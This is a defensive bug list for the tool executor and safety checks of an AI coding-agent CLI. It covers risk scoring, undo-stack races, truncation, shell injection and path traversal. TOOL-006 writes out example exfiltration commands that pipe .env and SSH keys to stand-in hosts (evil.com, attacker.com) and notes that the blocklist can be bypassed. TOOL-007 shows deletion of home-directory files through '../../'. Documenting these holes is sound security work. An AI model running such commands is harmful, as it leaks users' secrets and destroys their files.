# Tool Executor & Safety — Bugs & Issues

---

## [TOOL-001] `scoreRisk` Doesn't Differentiate Between File Types — `.env` Gets Same Score as `.txt`

- **Description**: The risk scoring in `scoreRisk()` checks tool name (`write_file` = medium, `run_shell` = high) but doesn't consider the TARGET file. Writing to `.env`, `package.json`, or `Dockerfile` should score higher than writing to `src/utils.js`.
- **Current vs Expected Behavior**: `write_file` to `.env` gets the same "medium" risk score as `write_file` to `src/app.js`. Both may or may not prompt the user depending on the overall risk threshold.
- **Flow**: Subagent calls `write_file` on `.env` → risk = medium → no prompt if threshold allows medium → `.env` overwritten silently
- **Root Cause / Logic**: [tools.js risk scoring section](file:///d:/projects/mcoode/packages/cli/src/core/tools.js) — risk assessment is tool-based, not file-based
- **Affected Files**: [`packages/cli/src/core/tools.js`](file:///d:/projects/mcoode/packages/cli/src/core/tools.js)
- **Suggested Fix**: Add file-sensitivity multiplier: config files (`.env`, `*.json`, `Dockerfile`, CI configs) = high; source files = medium; test files = low
- **Priority**: High
- **Phase**: Phase 1
- **TODOs**:
  - [ ] Add file-type risk multiplier
  - [ ] Always prompt for config file writes

---

## [TOOL-002] UndoStack JSON Corruption on Concurrent Writes

- **Description**: `UndoStack` reads the JSON file, modifies the in-memory array, and writes it back. If two subagents call `snapshot()` simultaneously, they both read the same state, both append, and the last writer wins — the first snapshot is silently lost.
- **Current vs Expected Behavior**: With 5 concurrent subagents, undo entries can be dropped. Expected: File-level locking or append-only format.
- **Flow**: Agent 1 reads undo.json → Agent 2 reads undo.json → Agent 1 appends entry A, writes → Agent 2 appends entry B, writes → entry A lost
- **Root Cause / Logic**: [tools.js L787-805](file:///d:/projects/mcoode/packages/cli/src/core/tools.js#L787-L805) — read-modify-write without locking
- **Affected Files**: [`packages/cli/src/core/tools.js`](file:///d:/projects/mcoode/packages/cli/src/core/tools.js)
- **Suggested Fix**: Use file locking (proper-lockfile) or switch to append-only JSONL format
- **Priority**: High
- **Phase**: Phase 1
- **TODOs**:
  - [ ] Add file locking to UndoStack operations
  - [ ] Or switch to JSONL append format

---

## [TOOL-003] `undo()` Falls Back to Most Recent Entry If ID Not Found — May Revert Wrong File

- **Description**: `undo(id)` tries to find the entry by ID. If not found (e.g., typo), it falls back to `this.entries.pop()` — reverting the most recent write, which may be a completely different file.
- **Current vs Expected Behavior**: `mcode undo some-typo-id` → silently reverts the last write to ANY file instead of reporting "ID not found". The user thinks they undid one thing but reverted something else.
- **Flow**: User types `mcode undo xyz` → ID "xyz" not found → `entries.pop()` → reverts last entry (could be a critical file)
- **Root Cause / Logic**: [tools.js L809-816](file:///d:/projects/mcoode/packages/cli/src/core/tools.js#L809-L816) — fallback to pop instead of error
- **Affected Files**: [`packages/cli/src/core/tools.js`](file:///d:/projects/mcoode/packages/cli/src/core/tools.js)
- **Suggested Fix**: If `id` is provided and not found, return null (not found) instead of falling back to pop
- **Priority**: High
- **Phase**: Phase 1
- **TODOs**:
  - [ ] Return null when specific ID not found
  - [ ] Only fall back to pop() when no ID is provided

---

## [TOOL-004] `edit_file` Search/Replace Applies Only First Match — No `replaceAll` Semantics

- **Description**: `edit_file` uses `source.replace(search, replace)` which only replaces the FIRST occurrence. If the search pattern appears multiple times, only the first is changed, potentially breaking the file.
- **Current vs Expected Behavior**: AI model may intend to replace all occurrences of a pattern but only the first is changed. The file ends up in an inconsistent state.
- **Flow**: AI calls `edit_file` to change `var x = 1` to `let x = 1` → only first `var x = 1` changed → other occurrences remain as `var`
- **Root Cause / Logic**: JavaScript `String.replace(string, string)` only replaces first match
- **Affected Files**: [`packages/cli/src/core/tools.js`](file:///d:/projects/mcoode/packages/cli/src/core/tools.js)
- **Suggested Fix**: Use `replaceAll()` or add a `replaceAll: boolean` flag; or document single-match behavior in the tool description
- **Priority**: Medium
- **Phase**: Phase 2
- **TODOs**:
  - [ ] Add replaceAll parameter to edit_file
  - [ ] Document single-match behavior

---

## [TOOL-005] `read_file` Truncates to 8000 Chars — AI Misses Context at End of Large Files

- **Description**: `read_file` returns `source.slice(0, 8000)` for files > 8KB. The AI gets the beginning of the file but not the end, potentially missing important code (exports, error handlers, cleanup functions).
- **Current vs Expected Behavior**: Large files are silently truncated. The AI may make edits that conflict with code it never saw (at the bottom of the file).
- **Flow**: AI reads a 15KB file → only sees first 8KB → makes changes assuming functions don't exist → creates duplicates
- **Root Cause / Logic**: [tools.js read_file handler](file:///d:/projects/mcoode/packages/cli/src/core/tools.js) — hard 8000 char limit
- **Affected Files**: [`packages/cli/src/core/tools.js`](file:///d:/projects/mcoode/packages/cli/src/core/tools.js)
- **Suggested Fix**: Add `offset` and `length` parameters; or return `[TRUNCATED: X more chars]` message so AI can request the rest
- **Priority**: Medium
- **Phase**: Phase 2
- **TODOs**:
  - [ ] Add pagination/offset support to read_file
  - [ ] Include truncation indicator in response

---

## [TOOL-006] `run_shell` Uses `shell: true` with `execa` — Enables Shell Injection

- **Description**: The `run_shell` tool passes the user's command string directly to the shell interpreter via `execa(command, { shell: true })`. This enables all shell features: pipes, redirects, command chaining, backtick execution, etc.
- **Current vs Expected Behavior**: AI can run `echo $(cat ~/.ssh/id_rsa)` or `cmd.exe /c "type .env | curl -d @- attacker.com"`. The blocklist catches some obvious destructive commands but not data exfiltration.
- **Flow**: Subagent → `run_shell("cat .env && curl -d @- evil.com")` → not in blocklist → executes
- **Root Cause / Logic**: `shell: true` in execa options; token-level blocklist is inherently bypassable
- **Affected Files**: [`packages/cli/src/core/tools.js`](file:///d:/projects/mcoode/packages/cli/src/core/tools.js)
- **Suggested Fix**: Parse command into argv array; use `execa(program, args)` without `shell: true`; validate program against allowlist
- **Priority**: High (see also SEC-004)
- **Phase**: Phase 1
- **TODOs**:
  - [ ] Remove shell: true
  - [ ] Parse commands safely
  - [ ] Implement command allowlist

---

## [TOOL-007] `delete_file` Calls `rm()` Without Checking `.projectPath` Boundary

- **Description**: The `delete_file` tool resolves the path relative to `projectPath` but doesn't verify the resolved path is still INSIDE the project directory. Path traversal (`../../.bashrc`) could delete files outside the project.
- **Current vs Expected Behavior**: `delete_file({ path: "../../.bashrc" })` would resolve to `/home/user/.bashrc` and delete it. Expected: Path traversal detection and rejection.
- **Flow**: AI calls `delete_file("../../.npmrc")` → `resolve(projectPath, "../../.npmrc")` → `/home/user/.npmrc` → deleted
- **Root Cause / Logic**: [tools.js delete_file handler](file:///d:/projects/mcoode/packages/cli/src/core/tools.js) — no path boundary check
- **Affected Files**: [`packages/cli/src/core/tools.js`](file:///d:/projects/mcoode/packages/cli/src/core/tools.js)
- **Suggested Fix**: After `resolve()`, check that the resulting path `startsWith(this.projectPath)`; reject if not
- **Priority**: High
- **Phase**: Phase 1
- **TODOs**:
  - [ ] Add path traversal check to delete_file
  - [ ] Add same check to write_file and edit_file
  - [ ] Add same check to read_file

---

## [TOOL-008] UndoStack `load()` Catches All Errors Including Parse Errors — Silently Loses History

- **Description**: `UndoStack.load()` catches ALL exceptions (including JSON parse errors). If the undo file is corrupted, `this.entries = []` is set silently, losing all undo history.
- **Current vs Expected Behavior**: A single byte corruption in `undo.json` loses ALL undo entries silently. Expected: Backup before clearing; log warning; attempt partial recovery.
- **Flow**: Power outage during undo.json write → file corrupted → next load → `this.entries = []` → all undo history gone
- **Root Cause / Logic**: [tools.js L798-804](file:///d:/projects/mcoode/packages/cli/src/core/tools.js#L798-L804) — bare catch resets to empty
- **Affected Files**: [`packages/cli/src/core/tools.js`](file:///d:/projects/mcoode/packages/cli/src/core/tools.js)
- **Suggested Fix**: Backup corrupted file before clearing; log warning; use JSONL format for crash resilience
- **Priority**: Medium
- **Phase**: Phase 2
- **TODOs**:
  - [ ] Backup corrupted undo files
  - [ ] Log warning on parse failure
  - [ ] Consider JSONL format

---

## [TOOL-009] `web_search` Returns Only 5 Results — No Pagination

- **Description**: The `web_search` tool returns a fixed 5 results with no option for pagination or more results. For research-heavy tasks, 5 results is often insufficient.
- **Current vs Expected Behavior**: AI gets 5 search results regardless of query complexity. For rare topics, all 5 may be irrelevant.
- **Flow**: AI searches "obscure npm package migration guide" → 5 results → none relevant → stuck
- **Root Cause / Logic**: [tools.js web_search handler](file:///d:/projects/mcoode/packages/cli/src/core/tools.js) — hardcoded limit
- **Affected Files**: [`packages/cli/src/core/tools.js`](file:///d:/projects/mcoode/packages/cli/src/core/tools.js)
- **Suggested Fix**: Add `count` parameter (default 5, max 20); add `page` parameter for pagination
- **Priority**: Low
- **Phase**: Phase 3
- **TODOs**:
  - [ ] Add configurable result count
  - [ ] Add pagination support

---

## [TOOL-010] Tool Descriptions Don't Include Failure Modes — AI Can't Self-Recover

- **Description**: Tool descriptions only describe happy-path behavior. They don't mention: what happens on file-not-found, permission denied, timeout, or disk-full. The AI can't anticipate or handle errors.
- **Current vs Expected Behavior**: When `read_file` fails, the AI gets `"Error: ENOENT: no such file or directory"` but doesn't know this means the file doesn't exist, because the tool description didn't mention this possibility.
- **Flow**: AI tries to read non-existent file → error → AI retries same file → error → blocked after 3 attempts
- **Root Cause / Logic**: [tools.js tool definitions](file:///d:/projects/mcoode/packages/cli/src/core/tools.js) — descriptions lack error documentation
- **Affected Files**: [`packages/cli/src/core/tools.js`](file:///d:/projects/mcoode/packages/cli/src/core/tools.js)
- **Suggested Fix**: Add error cases to each tool's description; include recovery suggestions
- **Priority**: Medium
- **Phase**: Phase 2
- **TODOs**:
  - [ ] Add error documentation to tool descriptions
  - [ ] Include recovery suggestions in error messages
